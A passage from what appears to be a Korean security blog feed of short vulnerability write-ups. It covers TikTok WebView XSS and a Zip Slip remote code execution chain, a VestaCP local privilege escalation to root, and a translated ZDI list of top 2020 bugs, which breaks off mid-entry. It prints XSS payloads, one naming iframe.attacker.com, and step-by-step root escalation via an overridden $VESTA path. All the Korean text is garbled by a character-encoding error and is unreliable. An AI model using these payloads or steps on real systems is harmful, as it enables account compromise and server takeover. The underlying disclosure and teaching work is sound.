ì¤‘ XSS, Zip Slip, RCE ì·¨ì•½ì ì— ëŒ€í•œ ìƒì„¸ ë‚´ìš©ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><p><strong>Universal XSS on TikTok WebView</strong></p><p>í‹±í†¡ì€ ë°›ì€ ë©”ì‹œì§€ì—ì„œ deep-linkë¡œ í˜¸ì¶œë  ìˆ˜ ìˆëŠ” íŠ¹ì • WebViewë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤. WebViewëŠ” ì„±ëŠ¥ì„ í–¥ìƒí•˜ê¸° ìœ„í•´ ì‚¬ìš©í•  ë•Œë§ˆë‹¤ ì„œë²„ì—ì„œ ê°€ì ¸ì˜¤ëŠ” ëŒ€ì‹  ë‚´ë¶€ íŒŒì¼ì—ì„œ ê°€ì ¸ì˜¤ëŠ” falcon linkë¼ëŠ” ê²ƒì„ ì‚¬ìš©í•©ë‹ˆë‹¤. ì„±ëŠ¥ì„ ì¸¡ì •í•˜ê¸° ìœ„í•´ í˜ì´ì§€ê°€ ë¡œë”©ë˜ë©´ ë‹¤ìŒê³¼ ê°™ì€ í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•©ë‹ˆë‹¤.</p><pre><code class="hljs kotlin"><span class="hljs-keyword">this</span>.a.evaluateJavascript(<span class="hljs-string">&quot;JSON.stringify(window.performance.getEntriesByName(\&#x27;&quot;</span> + <span class="hljs-keyword">this</span>.webviewURL + <span class="hljs-string">&quot;\&#x27;))&quot;</span>, v2);</code></pre><p>í˜ì´ë¡œë“œëŠ” query string segmentë¡œ ì¸ì½”ë”© ë˜ê¸° ë•Œë¬¸ì— <code>getEntriesByName</code>ì˜ URL ë’¤ì— <code>#</code>ì„ ì¶”ê°€í•œ í›„ í˜ì´ë¡œë“œë¥¼ ì‚½ì…í•˜ë©´ ì •ìƒì ìœ¼ë¡œ ìŠ¤í¬ë¦½íŠ¸ê°€ ë™ì‘í•˜ê²Œ ë©ë‹ˆë‹¤.</p><pre><code class="hljs reasonml"><span class="hljs-module-access"><span class="hljs-module"><span class="hljs-identifier">JSON</span>.</span></span>stringify(window.performance.get<span class="hljs-constructor">EntriesByName(&#x27;<span class="hljs-params">https</span>:<span class="hljs-operator">/</span><span class="hljs-operator">/</span><span class="hljs-params">m</span>.<span class="hljs-params">tiktok</span>.<span class="hljs-params">com</span><span class="hljs-operator">/</span><span class="hljs-params">falcon</span><span class="hljs-operator">/</span>#&#x27;)</span>,alert(<span class="hljs-number">1</span>));<span class="hljs-comment">//&#x27;))</span></code></pre><p><strong>Another XSS on AddWikiActivity</strong></p><p><code>AddWikiActivity</code>ëŠ” ì•…ì„± URLì´ ì—´ë¦¬ì§€ ì•Šë„ë¡ URL ê²€ì‚¬ë¥¼ í•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ <code>http</code>ë‚˜ <code>https</code> schemeë§Œ í™•ì¸ì„ í•˜ë¯€ë¡œ ë‹¤ë¥¸ schemeì— ëŒ€í•´ì„œëŠ” ê²€ì‚¬ë¥¼ ì§„í–‰í•˜ì§€ ì•ŠìŠµë‹ˆë‹¤. ì˜ˆë¥¼ ë“¤ì–´ <code>javascript</code> schemeë¥¼ ì‚¬ìš©í•˜ì—¬ í˜ì´ë¡œë“œë¥¼ êµ¬ì„±í•˜ë©´ XSSê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><pre><code class="hljs perl">window.ToutiaoJSBridge.invokeMethod(JSON.stringify(&#123;    <span class="hljs-string">&quot;__callback_id&quot;</span>: <span class="hljs-string">&quot;0&quot;</span>,    <span class="hljs-string">&quot;func&quot;</span>: <span class="hljs-string">&quot;openSchema&quot;</span>,    <span class="hljs-string">&quot;__msg_type&quot;</span>: <span class="hljs-string">&quot;callback&quot;</span>,    <span class="hljs-string">&quot;params&quot;</span>: &#123;        <span class="hljs-string">&quot;schema&quot;</span>: <span class="hljs-string">&quot;aweme://wiki?url=javascript://m.tiktok.com/%250adocument.write(%22%3Ch1%3EPoC%3C%2Fh1%3E%22)&amp;disable_app_link=false&quot;</span>    &#125;,    <span class="hljs-string">&quot;JSSDK&quot;</span>: <span class="hljs-string">&quot;1&quot;</span>,    <span class="hljs-string">&quot;namespace&quot;</span>: <span class="hljs-string">&quot;host&quot;</span>,    <span class="hljs-string">&quot;__iframe_url&quot;</span>: <span class="hljs-string">&quot;http://iframe.attacker.com/&quot;</span>&#125;));</code></pre><p><strong>Remote Code Execution</strong></p><p>RCEë¥¼ í•˜ê¸° ìœ„í•´ì„œ zip fileì„ ìƒì„±í•˜ê³ , path traversalì„ í†µí•´ <code>/data/data/com.zhiliaoapp.musically/app_lib/df_rn_kit/df_rn_kit_a3e37c20900a22bc8836a51678e458f7/arm64-v8a/libjsc.so</code>ì„ overwrite í•´ì•¼ í•©ë‹ˆë‹¤. ì´ë¥¼ ìœ„í•´ì„œ Zip Slip ì·¨ì•½ì ì´ ì‚¬ìš©ë©ë‹ˆë‹¤.</p><p><code>TmaTestActivity</code>ëŠ” ì¸í„°ë„·ì—ì„œ zip íŒŒì¼ì„ í†µí•´ SDKë¥¼ ì—…ë°ì´íŠ¸í•©ë‹ˆë‹¤. ì´ë•Œ <code>DownloadBaseBundleHandler</code>ì—ì„œ <code>sdkUpdateVersion</code> íŒŒë¼ë¯¸í„°ë¥¼ í™•ì¸í•˜ì—¬ ë²„ì „ì„ í™•ì¸í•˜ëŠ”ë°, ê°’ì„ <code>99.99.99</code>ë¡œ ì„¤ì •í•˜ë©´ ê²€ì‚¬ë¥¼ í†µê³¼í•˜ì—¬ ë‹¤ìš´ë¡œë“œë¥¼ ì‹œì‘í•©ë‹ˆë‹¤. ë‹¤ìš´ë¡œë“œ í›„ íŒŒì¼ ì´ë¦„ì— ìˆëŠ” <code>&#123;md5sum_of_file&#125;</code>ê³¼ íŒŒì¼ì˜ md5sum ê°’ì„ ë¹„êµí•˜ë¯€ë¡œ íŒŒì¼ ì´ë¦„ì€ <code>anything_&#123;md5sum_of_file&#125;.zip</code>ì´ ë˜ì–´ì•¼ í•©ë‹ˆë‹¤. ê·¸ í›„ ë‹¤ìš´ë¡œë“œ í•œ íŒŒì¼ì€ ì •ìƒì ìœ¼ë¡œ ì••ì¶•ì´ í•´ì œë˜ì–´ native-libraryë¥¼ ì•…ì„± ë¼ì´ë¸ŒëŸ¬ë¦¬ë¡œ overwrite í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ë¼ì´ë¸ŒëŸ¬ë¦¬ë¥¼ overwirte í•œ í›„ ì• í”Œë¦¬ì¼€ì´ì…˜ì„ ì¬ì‹¤í–‰í•˜ê±°ë‚˜ <code>com.tt.miniapphost.placeholder.MiniappTabActivity0</code>ë¥¼ í†µí•´ Remote Code Executionì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ë“¤ì€ XSS ì½”ë“œ ìˆ˜ì •, <code>TmaTestActivity</code> ì‚­ì œ, <code>intent</code> scheme ì œí•œ êµ¬í˜„ìœ¼ë¡œ ìˆ˜ì •ë˜ì—ˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>rce</tag>
      
      <tag>xss</tag>
      
      <tag>idioth</tag>
      
      <tag>tiktok</tag>
      
      <tag>zip-slip</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] VestaCP Local Privilege Escalation ì·¨ì•½ì </title>
    <link href="/2021/03/21/insu/2021-03-21/"/>
    <url>/2021/03/21/insu/2021-03-21/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://ssd-disclosure.com/ssd-advisory-vestacp-lpe-vulnerabilities/">SSD Advisory â€“ VestaCP LPE Vulnerabilities</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>VestCP 0.9.8-24 ì´í•˜ ë²„ì „</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>ì˜¤í”ˆì†ŒìŠ¤ ì›¹ í˜¸ìŠ¤íŒ… ì œì–´íŒì¸ VESTA Control Panel(VestaCP)ì—ì„œ userê°€ adminìœ¼ë¡œ ê¶Œí•œ ìƒìŠ¹í•  ìˆ˜ ìˆëŠ” ì·¨ì•½ì ì´ ë°œê²¬ë˜ì—ˆìŠµë‹ˆë‹¤.</p><p>í•´ë‹¹ ì·¨ì•½ì ì€ <code>/add/web/index.php</code>ì—ì„œ í˜¸ì¶œë˜ëŠ” v-add-web-domain ì‰˜ ìŠ¤í¬ë¦½íŠ¸ì—ì„œ ë°œìƒí•©ë‹ˆë‹¤. í•´ë‹¹ ìŠ¤í¬ë¦½íŠ¸ëŠ” ë””ë ‰í„°ë¦¬ë‚˜ íŒŒì¼ì˜ ë‚´ìš©ì´ ì¡´ì¬í•˜ëŠ”ì§€ì— ê²€ì‚¬ ì—†ì´ ë‹¤ìŒ ëª…ë ¹ì–´ë¥¼ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><pre><code class="hljs basic"><span class="hljs-symbol">88 </span>: # Changing file owner &amp; permission<span class="hljs-symbol">89 </span>: chown -R $user:$user $HOMEDIR/$user/web/$domain<span class="hljs-symbol">90 </span>: chown root:$user /var/<span class="hljs-keyword">log</span>/$WEB_SYSTEM/domains/$domain.* $conf<span class="hljs-symbol">91 </span>: chmod <span class="hljs-number">640</span> /var/<span class="hljs-keyword">log</span>/$WEB_SYSTEM/domains/$domain.*<span class="hljs-symbol">92 </span>: chmod <span class="hljs-number">751</span> $HOMEDIR/$user/web/$domain $HOMEDIR/$user/web/$domain/*<span class="hljs-symbol">93 </span>: chmod <span class="hljs-number">551</span> $HOMEDIR/$user/web/$domain/stats $HOMEDIR/$user/web/$domain/logs<span class="hljs-symbol">94 </span>: chmod <span class="hljs-number">644</span> $HOMEDIR/$user/web/$domain/public_*html/*.*</code></pre><p>ìœ„ì˜ ëª…ë ¹ì–´ë“¤ì€ <code>$domain</code> í´ë”ì—ì„œ ì‚¬ìš©ë˜ë¯€ë¡œ 94 ì¤„ì˜ ëª…ë ¹ì„ í†µí•´ ì½ê³  ì‹¶ì€ íŒŒì¼ì˜ ê¶Œí•œì„ ë³€ê²½í•  ìˆ˜ ìˆê³ , 92 ì¤„ì˜ ëª…ë ¹ì„ í†µí•´ í´ë”ì˜ ì ‘ê·¼ ê¶Œí•œì„ ë³€ê²½í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><p>ë˜í•œ VestaCPëŠ” ì‚¬ìš©ìë¥¼ ì¶”ê°€í•˜ê±°ë‚˜ ë¦¬ìŠ¤íŠ¸ í•˜ëŠ” ë“±ì˜ web-appì˜ ëª¨ë“  ê¸°ëŠ¥ì„ bash ìŠ¤í¬ë¦½íŠ¸ì— ì˜ì¡´í•©ë‹ˆë‹¤. ì´ëŸ¬í•œ bash ìŠ¤í¬ë¦½íŠ¸ë“¤ì€ root ì†Œìœ ì´ë©° ë³€ê²½í•  ìˆ˜ ì—†ì§€ë§Œ, <code>sudo -l</code>ì„ í†µí•´ íŒ¨ìŠ¤ì›Œë“œ ì…ë ¥ ì—†ì´ adminì´ root ê¶Œí•œìœ¼ë¡œ ì´ëŸ¬í•œ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤. ì´ë¥¼ í†µí•´ rootë¡œ ê¶Œí•œ ìƒìŠ¹í•˜ëŠ” ë°©ë²•ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤.</p><ol><li>v-list-user ìŠ¤í¬ë¦½íŠ¸ì— <code>source $VESTA/func/main.sh</code>ê°€ ì¡´ì¬í•˜ë¯€ë¡œ <code>/tmp/func</code> í´ë”ì— <code>/bin/bash</code> ì‰˜ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ìƒì„±í•©ë‹ˆë‹¤.</li><li>íŒ¨ìŠ¤ì›Œë“œ ì…ë ¥ ì—†ì´ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆìœ¼ë¯€ë¡œ í™˜ê²½ ë³€ìˆ˜ <code>$VESTA</code>ë¥¼ <code>/tmp</code>ë¡œ overwrite í•©ë‹ˆë‹¤.</li><li>v-list-userë¥¼ ì‹¤í–‰í•˜ë©´, root ê¶Œí•œì„ íšë“í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</li></ol>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>lpe</tag>
      
      <tag>insu</tag>
      
      <tag>vestacp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Translation] ZDIì—ì„œ ì„ ì •í•œ 2020ë…„ ì œì¼ ì¤‘ìš”í•œ ì·¨ì•½ì  Top 5</title>
    <link href="/2021/03/21/j0ker/zdi_2020_vuln/"/>
    <url>/2021/03/21/j0ker/zdi_2020_vuln/</url>
    
    <content type="html"><![CDATA[<p>ì•ˆë…•í•˜ì„¸ìš”. ë¯¿ê±° ì¡° ì”¨ ì§‘ì•ˆ 28ëŒ€ì† Joker(ì¡°-ì»¤)ì…ë‹ˆë‹¤. ì²« ê¸€ì€ ë¶€ë‹´ìŠ¤ëŸ½ì§€ ì•Šê²Œ ë²ˆì—­ê¸€ë¡œ ì¤€ë¹„í•´ë´¤ìŠµë‹ˆë‹¤. ì•ìœ¼ë¡œ ì¬ë¯¸ìˆëŠ” ì—°êµ¬ ë§ì´ í•´ì„œ ì¢‹ì€ ê¸€ ì˜¬ë ¤ë“œë¦¬ë„ë¡ í•˜ê² ìŠµë‹ˆë‹¤ (__ __) ì°¸ê³ ë¡œ ë²ˆì—­ì—ëŠ” ì˜ì—­ì´ ë§ì„ ì˜ˆì •ì…ë‹ˆë‹¤. ì´ëŸ° ê±¸ë¡œ íƒœí´ ã„´ã„´</p><p><img src="/2021/03/21/j0ker/zdi_2020_vuln/Untitled.png"></p><p>ë‘ë‘ë“±ì¥</p><hr><p>ì—°ë§ì´ ë˜ë©´ì„œ, ìš°ë¦¬ëŠ” 2020ë…„ì— ë°›ì€ ì·¨ì•½ì ë“¤ì„ ë’¤ëŒì•„ ë³´ë©´ì„œ ìµœê³ ì˜ ì·¨ì•½ì ë“¤ì„ ë½‘ì•„ë³´ë©´ ì–´ë–¨ê¹Œë¼ëŠ” ìƒê°ì„ í•˜ê²Œ ë˜ì—ˆë‹¤. ìƒê°ì€ ì´ë ‡ê²Œ í–ˆì§€ë§Œ, ì‘ë…„ì—(ê¸€ì€ ì‘ë…„ì— ë‚˜ì˜¨ ê±°ë¼ ì˜¬í•´ë¼ê³  ë˜ì–´ ìˆì§€ë§Œ ì½ê¸° í¸í•˜ë„ë¡ í˜„ì¬ ì‹œì ì—ì„œ ì‘ë…„ì´ë¼ í•˜ê² ë‹¤) ìš°ë¦¬ê°€ ê³µê°œí•œ Advisorë“¤ì˜ ìˆ˜ê°€ ê±°ì˜ ìµœê³ ì— ë‹¤ë‹¤ëê¸° ë•Œë¬¸ì— 1400ê°œê°€ ë„˜ëŠ” ë²„ê·¸ë“¤ ì¤‘ì—ì„œ ìµœê³ ì˜ ë²„ê·¸ 5ê°œë¥¼ ê³¨ë¼ë‚´ëŠ” ê²ƒì€ ìƒê°ë³´ë‹¤ ì–´ë ¤ìš´ ì¼ì´ì—ˆë‹¤. ê·¸ë¦¬ê³  ë§ˆì¹¨ë‚´ ìš°ë¦¬ëŠ” 2020ë…„ì— ì œì¶œëœ ë²„ê·¸ë“¤ ì¤‘ ìµœê³ ì˜ ë²„ê·¸ Top 5ë¥¼ ê¼½ì•„ë³´ì•˜ë‹¤! ì§œì”!</p><h1 id="CVE-2020-0688-ZDI-20-258"><a href="#CVE-2020-0688-ZDI-20-258" class="headerlink" title="CVE-2020-0688/ZDI-20-258"></a>CVE-2020-0688/ZDI-20-258</h1><p><strong>Microsoft Exchange Server Exchange Control Panel Fixed Cryptographic Key Remote Code Execution Vulnerability</strong></p><p>ì´ ì·¨ì•½ì ì€ Microsoft Exchange Serverì˜ Exchange Admin Center ì›¹ ì¸í„°í˜ì´ìŠ¤ì—ì„œ ë°œê²¬ëœ ë§¤ìš° í¬ë¦¬í‹°ì»¬í•œ ì·¨ì•½ì ìœ¼ë¡œ, ì¸ì¦ëœ Exchange ì‚¬ìš©ìëŠ” ì´ ì·¨ì•½ì ì„ í†µí•´ ì„œë²„ì˜ SYSTEM ê¶Œí•œì„ ì–»ì„ ìˆ˜ ìˆë‹¤. ì´ ì›¹ ì¸í„°í˜ì´ìŠ¤ëŠ” â€œAdminâ€ ì¸í„°í˜ì´ìŠ¤ë¼ê³  ë¶ˆë¦¬ê¸°ëŠ” í•˜ì§€ë§Œ, Exchange ì„œë²„ì˜ mailboxì— ëŒ€í•œ ì¸ì¦ì„œë¥¼ ê°€ì§€ê³  ìˆëŠ” ìœ ì €ë¼ë©´ ëª¨ë‘ ì ‘ê·¼ì´ ê°€ëŠ¥í•˜ë©° Outlook Web Accessì™€ ê°™ì´ ë„¤íŠ¸ì›Œí¬ì— ë…¸ì¶œë˜ì–´ ìˆë‹¤. ì´ ì·¨ì•½ì ì€ Exchange Admin Center ASP.NETì— ì„¤ì¹˜ë˜ì–´ ìˆëŠ” ì•”í˜¸í™” í‚¤(â€œmachine keysâ€)ì™€ ì—°ê´€ì´ ìˆë‹¤. Exchangeì—ì„œëŠ” ì„¤ì¹˜í•  ë•Œë§ˆë‹¤ ì´ í‚¤ë“¤ì„ ëœë¤í•˜ê²Œ ìƒì„±í•˜ì—¬ í•´ë‹¹ í‚¤ê°€ ìœ ë‹ˆí¬í•˜ê³  ì•ˆì „í•˜ë„ë¡ í•´ì•¼ í•œë‹¤. í•˜ì§€ë§Œ, ì‹¤ì œë¡œëŠ” ì´ í‚¤ë“¤ì„ install mediaì—ì„œ ë°”ë¡œ ë³µì‚¬í•´ì˜¤ëŠ”ë°, ì´ë¡œ ì¸í•´ í•´ì»¤ê°€ ë‹¤ë¥¸ ì œí’ˆì˜ installationì„ ì°¸ê³ í•˜ì—¬ ì´ í‚¤ë“¤ì„ ì•Œ ìˆ˜ ìˆë‹¤. í•´ì»¤ëŠ” ì´ í‚¤ë“¤ì„ ì´ìš©í•´ ì„œë²„ì— ì¡°ì‘ëœ ë©”ì‹œì§€ë¥¼ ë³´ë‚´ê³ , í•´ë‹¹ ë©”ì‹œì§€ê°€ deserialize ë˜ë©´ì„œ arbitrary code executionì„ í•  ìˆ˜ ìˆë‹¤. ExchangeëŠ” ë³´í†µ ì—”í„°í”„ë¼ì´ì¦ˆì˜ ì¤‘ì‹¬ì— ìˆê¸° ë•Œë¬¸ì— Exchange Serverì˜ ì·¨ì•½ì ì€ ë§¤ìš° ì¤‘ìš”í•˜ê³  í•´ì»¤ë“¤ë„ ë§¤ìš° íƒë‚¸ë‹¤. ë§Œì•½ ë‹¹ì‹ ì˜ ì¡°ì§ì—ì„œ ì•„ì§ ì´ ì·¨ì•½ì ì„ íŒ¨ì¹˜í•˜ì§€ ì•Šì•˜ë‹¤ë©´, ìµœëŒ€í•œ ë¹¨ë¦¬ íŒ¨ì¹˜ë¥¼ ì§„í–‰í•˜ê¸¸ ë°”ë€ë‹¤. ì¢€ ë” ë””í…Œì¼í•œ ë‚´ìš©ë“¤ì€ ì´ <a href="https://www.zerodayinitiative.com/blog/2020/2/24/cve-2020-0688-remote-code-execution-on-microsoft-exchange-server-through-fixed-cryptographic-keys">ë§í¬</a>ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p><h1 id="CVE-2020-3992-ZDI-20-1377"><a href="#CVE-2020-3992-ZDI-20-1377" class="headerlink" title="CVE-2020-3992/ZDI-20-1377"></a>CVE-2020-3992/ZDI-20-1377</h1><p><strong>VMware ESXi SLP Use-After-Free Remote Code Execution Vulnerability</strong></p><p>ì´ ë²„ê·¸ëŠ” ZDI ì·¨ì•½ì  ì—°êµ¬ì› Lucas Leongì´ ë°œê²¬í•œ ë²„ê·¸ì´ë‹¤. ESXiëŠ” VMWare ì‚¬ì—ì„œ ê°œë°œí•œ ì—”í„°í”„ë¼ì´ì¦ˆê¸‰ í•˜ì´í¼ë°”ì´ì €ì´ë‹¤. Service Location Protocol(SLP)ëŠ” ESXiì— ê¸°ë³¸ì ìœ¼ë¡œ í™œì„±í™”ë˜ì–´ ìˆëŠ” í”„ë¡œí† ì½œ ì¤‘ í•˜ë‚˜ì´ë‹¤. SDPëŠ” í´ë¼ì´ì–¸íŠ¸ê°€ ë„¤íŠ¸ì›Œí¬ ì„œë¹„ìŠ¤ë¥¼ íƒìƒ‰í•  ìˆ˜ ìˆë„ë¡ ì§€ì›í•˜ëŠ” í”„ë¡œí† ì½œì´ë‹¤. SLPì—ì„œ ê°€ì¥ ì¸ê¸° ìˆëŠ” ê¸°ëŠ¥ì´ OpenSLPì¸ë°, LucasëŠ” ESXiì—ì„œ ìì²´ ì œì‘í•œ ë²„ì „ì„ ì‚¬ìš©í•œë‹¤ëŠ” ê²ƒì„ ë°œê²¬í•˜ì˜€ë‹¤. ê±°ê¸°ë‹¤ê°€ ì´ ìì²´ ì œì‘ ë²„ì „ì—ì„œ í¬ë¦¬í‹°ì»¬í•œ ì·¨ì•½ì  ë‘ ê°œê°€ ë°œê²¬ë˜ì—ˆë‹¤.</p><p><a href="https://www.zerodayinitiative.com/advisories/ZDI-20-1377/">ì²« ë²ˆì§¸ ì·¨ì•½ì </a>ì€ Use-After-Free(UAF) ì·¨ì•½ì ìœ¼ë¡œ <code>SLPDPorcessMessage()</code>ì—ì„œ SLPMessage ì˜¤ë¸Œì íŠ¸ê°€ free ë˜ì—ˆìŒì—ë„ ë¶ˆêµ¬í•˜ê³  SLPDatabase êµ¬ì¡°ì²´ì—ì„œ ê³„ì†í•´ì„œ í•´ë‹¹ ë©”ëª¨ë¦¬ë¥¼ ë ˆí¼ëŸ°ìŠ¤ í•˜ê³  ìˆì–´ ë°œìƒí•œ ì·¨ì•½ì ì´ë‹¤. ì´ ì·¨ì•½ì ì€ WAN í™˜ê²½ì— ìˆëŠ” í•´ì»¤ì— ì˜í•´ í™œìš©ë  ìˆ˜ ìˆë‹¤.  </p><p>ì·¨ì•½ì ì´ ë°œê²¬ëœ ì´í›„, VMwareëŠ” ì´ ì·¨ì•½ì ì„ íŒ¨ì¹˜í•˜ì˜€ì§€ë§Œ ì œëŒ€ë¡œ ì²˜ë¦¬í•˜ì§€ ëª»í•˜ì˜€ê³  ZDI-CAN-12190ìœ¼ë¡œ íŒ¨ì¹˜ì— ëŒ€í•œ bypass ì·¨ì•½ì ì´ ì œë³´ë˜ì—ˆë‹¤. </p><p>ë˜ í•œ ê°€ì§€ ì£¼ëª©í• ë§Œí•œ ì ì€ ì´ ì·¨ì•½ì ì„ ì´ìš©í•´ì„œ ì›ê²©ìœ¼ë¡œ ê³µê²©í•  ìˆ˜ ìˆê¸°ë„ í•˜ì§€ë§Œ, ì œí•œëœ í™˜ê²½ì—ì„œ ì‹¤í–‰ë˜ëŠ” í”„ë¡œì„¸ìŠ¤ì—ì„œì˜ sandbox escapeë„ ê°€ëŠ¥í•˜ë‹¤ëŠ” ê²ƒì´ë‹¤. ì´ ì·¨ì•½ì ì„ í†µí•´, EXSi ê°™ì´ ë§ì´ ì—°êµ¬ëœ ì œí’ˆë“¤ì—ì„œë„ ì•„ì§ ì•Œì§€ ëª»í–ˆë˜(ì˜ ì‚´í´ë³´ì§€ ì•Šì•˜ë˜) attack surfaceë“¤ì´ ìˆë‹¤ëŠ” ê²ƒì„ ì•Œ ìˆ˜ ìˆì—ˆë‹¤.</p><h1 id="CVE-2020-9850-ZDI-20-672"><a href="#CVE-2020-9850-ZDI-20-672" class="headerlink" title="CVE-2020-9850/ZDI-20-672"></a>CVE-2020-9850/ZDI-20-672</h1><p><strong>Apple Safari in Operator JIT Type Confusion Remote Code Execution Vulnerability</strong></p><p>ì´ ë²„ê·¸ëŠ” Georgia Tech Systems Software &amp; Security LabíŒ€ì´ <a href="https://taesoo.kim/pubs/2020/jin:pwn2own2020-safari-slides.pdf">Pwn2Ownì— ì°¸ì—¬í•˜ë©´ì„œ</a> ì œë³´í•œ ë²„ê·¸ì´ë‹¤. ì´ ë²„ê·¸ëŠ” DFG ë‹¨ì—ì„œ ë°œìƒí•˜ëŠ” Webkit type confusionìœ¼ë¡œ ì‹œì‘ë˜ëŠ” ë²„ê·¸ ì²´ì¸ì˜ í•œ ë¶€ë¶„ìœ¼ë¡œ ì‘ë…„ì— ë°œê²¬ëœ ì´ <a href="https://www.zerodayinitiative.com/blog/2019/11/25/diving-deep-into-a-pwn2own-winning-webkit-bug">ë²„ê·¸</a>ì™€ ìœ ì‚¬í•˜ë‹¤. OpenGLâ€™s CVM(Core Virtual Machine)ì˜ í™ ì˜¤ë²„í”Œë¡œìš° ë²„ê·¸ì™€ ì²´ì´ë‹ í•˜ë©´ ì‚¬íŒŒë¦¬ì—ì„œ â€œ.appâ€ symlinkë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆë‹¤. ê·¸ëŸ° ë‹¤ìŒ ë ˆì´ìŠ¤ ì»¨ë””ì…˜ì„ í†µí•´ cfprefsdì™€ kextloadì—ì„œ first-time app protection ìš°íšŒ, root ì ‘ê·¼, ê¶Œí•œ ìƒìŠ¹ì´ ì°¨ë¡€ëŒ€ë¡œ ì´ë¤„ì§€ë©° ëª¨ë“  ê²ƒë“¤ì€ í”¼í•´ìê°€ ì›¹í˜ì´ì§€ë¥¼ ë°©ë¬¸í•˜ê³  ë‚œ í›„ ë°±ê·¸ë¼ìš´ë“œì—ì„œ ì´ë£¨ì–´ì§„ë‹¤. </p><p>í•œ ì›¹ í˜ì´ì§€ì— ì ‘ì†í–ˆëŠ”ë° 10ì´ˆ í›„ì— ì•…ì„±ì½”ë“œê°€ ë‹¹ì‹ ì˜ ì»´í“¨í„°ì—ì„œ ì‹¤í–‰ëœë‹¤ê³  ìƒê°í•´ë³´ë¼. ì†Œë¦„ì´ ë‹ì„ ì •ë„ì´ë‹¤. ê²°ê³¼ì ìœ¼ë¡œ ê·¸ë“¤ì€ Pwn2Ownì—ì„œ ì„±ê³µì ìœ¼ë¡œ ë°ëª¨ë¥¼ ë§ˆì³ $70,000ë¥¼ íšë“í•˜ì˜€ë‹¤. </p><h1 id="CVE-2020-7460-ZDI-20-949"><a href="#CVE-2020-7460-ZDI-20-949" class="headerlink" title="CVE-2020-7460/ZDI-20-949"></a>CVE-2020-7460/ZDI-20-949</h1><p><strong>FreeBSD Kernel sendmsg System Call Time-Of-Check Time-Of-Use Privilege Escalation Vulnerability</strong></p><p>ì´ ì·¨ì•½ì ì€ m00nbsdë¼ëŠ” ë‹‰ë„¤ì„ì„ ì‚¬ìš©í•˜ëŠ” í•œ ì—°êµ¬ì›ì´ ZDIì— ì œë³´í•˜ì˜€ë‹¤. í•´ì»¤ëŠ” FreeBSDì˜ 32-bit <code>sendmsg()</code> ì‹œìŠ¤í…œ ì½œì— ì¡´ì¬í•˜ëŠ” Time-Of-Check, Time-Of-Use(TOCTOU) ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ ë‚®ì€ ê¶Œí•œì—ì„œ kernel-level code executionì„ í•  ìˆ˜ ìˆë‹¤. ì´ ì·¨ì•½ì ì€ ì‹œìŠ¤í…œ ì½œì— ì¡´ì¬í•˜ëŠ” double-fetch ë²„ê·¸ë¡œ ìœ ì € ëœë“œì— ìˆëŠ” MsgLen ë³€ìˆ˜ì— ì²« accessê°€ ìˆê³  ë‚œ í›„, ë‘ ë²ˆì§¸ accessê°€ ë°œìƒí•˜ê¸° ì „ì— ë” í° ê°’ìœ¼ë¡œ ë°”ê¾¸ë©´ ì˜¤ë²„í”Œë¡œìš°ë¥¼ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆë‹¤. í•´ì»¤ëŠ” ë£¨í”„ì—ì„œ ì •ìƒì ì¸ ì¸ìë¡œ <code>sendmsg()</code>ë¥¼ í˜¸ì¶œí•˜ëŠ” ìŠ¤ë ˆë“œë¥¼ í•˜ë‚˜ì™€ MsgLenì„ í° ê°’ìœ¼ë¡œ ì¡°ì‘í•˜ëŠ” ìŠ¤ë ˆë“œ í•˜ë‚˜ë¥¼ ì‹¤í–‰í•˜ì—¬ ë ˆì´ìŠ¤ ì»¨ë””ì…˜ì„ ë°œìƒì‹œì¼œ ì˜¤ë²„í”Œë¡œìš°ë¥¼ íŠ¸ë¦¬ê±°í•  ìˆ˜ ìˆë‹¤. ì´ ë²„ê·¸ì˜ ë‚œì´ë„ëŠ” ë‚®ì§€ë§Œ ë¹„êµì  ì˜¤ë«ë™ì•ˆ ì‚´ì•„ë‚¨ì•˜ë‹¤. ìš°ë¦¬ëŠ” ì‘ë…„ 9ì›”ì— ì´ ë²„ê·¸ì— ëŒ€í•´ í¬ìŠ¤íŒ…ì„ í•˜ì˜€ìœ¼ë‹ˆ ê´€ì‹¬ì´ ìˆë‹¤ë©´ <a href="https://www.zerodayinitiative.com/blog/2020/9/1/cve-2020-7460-freebsd-kernel-privilege-escalation">ì—¬ê¸°</a>ì—ì„œ ìì„¸í•œ ë‚´ìš©ì„ í™•ì¸í•  ìˆ˜ ìˆë‹¤.</p><h1 id="CVE-2020-17057-ZDI-20-1371"><a href="#CVE-2020-17057-ZDI-20-1371" class="headerlink" title="CVE-2020-17057/ZDI-20-1371"></a><a 